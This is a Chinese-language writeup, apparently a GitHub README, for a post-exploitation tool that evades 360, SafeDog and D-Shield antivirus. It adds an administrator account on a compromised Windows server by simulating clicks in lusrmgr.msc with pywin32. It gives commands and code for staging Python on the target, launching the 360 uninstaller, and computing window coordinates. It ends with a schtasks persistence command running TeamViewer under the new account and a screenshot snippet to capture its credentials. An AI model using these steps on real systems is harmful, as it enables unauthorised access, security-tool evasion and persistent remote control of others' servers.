# BypassAVAddUsers
一种基于行为模拟的理论绕过所有杀毒软件添加管理用户的手法研究

360 安全狗 D盾实测通过

https://xz.aliyun.com/t/4078


### 0x01 About


嗯 这是一个企图Uninstall All AVs失败的产物

基本思路是模拟点击 输入

通过下面指令可运行360的卸载程序

```
cd "C:/Program Files/360/360safe/" & start uninst.exe
```

![15497698568564.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190211224834-1b965c40-2e0c-1.jpeg)


这程序的按钮有两个ShadowEdge保护

![15497830116988.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190211224853-268aed64-2e0c-1.jpeg)


直接运行py脚本取点击会被拒绝

新建一个bat再用start来启动就可以绕过了

http://v.youku.com/v_show/id_XNDA1NzEyMzkyMA==.html?spm=a2h3j.8428770.3416059.1


如视频所示 模拟点击处最终确认按钮后无法点击 

查阅资料得知这尼玛是360SPTools.exe设了很多阻碍 搞一天没突破

回念一想 不如直接添加用户 才有了本文


### 0x02 server

为了方便修改调整 采用Python做了本次任务的 不是每个目标上都有py的环境 所以手动配置咯


直接上传或使用下面脚本下载Python的embeddable版本到服务器（脚本不支持https 改半天实在没办法 需到Py官网下载后再上传到http的服务器上 带解压）

```
https://github.com/TheKingOfDuck/BypassAVAddUsers/blob/master/download.php
```

![15497688551641.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190211225513-09247596-2e0d-1.jpeg)

![0CE11AF8D40F1C7F767F18E2B2C64A2D.png](https://xzfile.aliyuncs.com/media/upload/picture/20190211225534-15a487a2-2e0d-1.png)



由于需要用到`pywin32`模块 该模块无法使用pip安装所以顺便安装一下

pip：
```
start python.exe ../get-pip.py
```
（踩坑经验：先修改环境目录下的`python37._pth`文件，去掉 #import site 前的注释再执行命令 否则也无法安装成功不注释 不使用start来运行也安装不成功）

pywin32：

```
start python.exe -m pip install pywin32
```

执行完所有需要的依赖也就安装好了 无需GUI即可完成。

### 0x03 AddUsers

刚开始是想通过控制面板添加用户 可以通过脚本执行`control userpasswords`打开控制面板 但是步骤不叫繁琐 而且进程是`explore` 窗口不好控制。

可通过`lusrmgr.msc`（本地用户和组管理工具）来做。

![15498938908367.jpg](https://xzfile.aliyuncs.com/media/upload/picture/20190211225600-25497230-2e0d-1.jpeg)


打开后需要计算图中中间那个"用户"按钮的位置 经过测试发现 它到顶端的距离和到坐标的距离无人为调整的话是不会边的 所有可获取该窗口左上角点的坐标来计算其坐标

```
#输出MMCMainFrame的窗口名称
MMCMainFrame = win32gui.FindWindow("MMCMainFrame", None)
# print("#######################")
titlename = (win32gui.GetWindowText(MMCMainFrame))
# print(titlename)
# print("#######################")

hWndChildList = []
a = win32gui.EnumChildWindows(MMCMainFrame, lambda hWnd, param: param.append(MMCMainFrame),  hWndChildList)
# print(a)

#获取窗口左上角和右下角坐标
a, b, c, d = win32gui.GetWindowRect(MMCMainFrame)
```

a, b,即为需要的值

```
# 计算得出MMCMainFrame窗口的顶边距离“用户”这个标签120个坐标点 该值除非调动 否则不变
# userPosH = 237 -117
# print(userPosL)
# userPosL = 120
#计算得出MMCMainFrame窗口的坐标边距离“用户”这个标签120个坐标点 该值除非调动 否则不变
# userPosH = 1145 - 915
# print(userPosH)
# userPosH = 230
```

(a + 230, b + 120 )即为需要的值 实战中如有出入可采用PIL模块截图回传下来计算。


剩下的就是常规的模拟点击 模拟输入 完整代码见：


```
https://github.com/TheKingOfDuck/BypassAVAddUsers/blob/master/adduser.py
```



### 0x03 Test

360全家桶 安全狗 D盾等AV ：



http://v.youku.com/v_show/id_XNDA1NzEyMzkyMA==.html?spm=a2h3j.8428770.3416059.1


### 0x03 Summary

添加用户后如果服务器没开3389可上传一个单文件版本的teamviewer
再通过下面指令运行起来

```
schtasks /create /sc minute /mo 1 /tn “cat” /tr TV的路径  /ru 创建的用户名 /rp 创建的密码
```

使用PIL截图获取连接ID密码：

```
from PIL import ImageGrab
im = ImageGrab.grab()
im.save('screenshot.png')
```

如此一来就不用任何0day 全程合法文件的取得了远程桌面的权限。




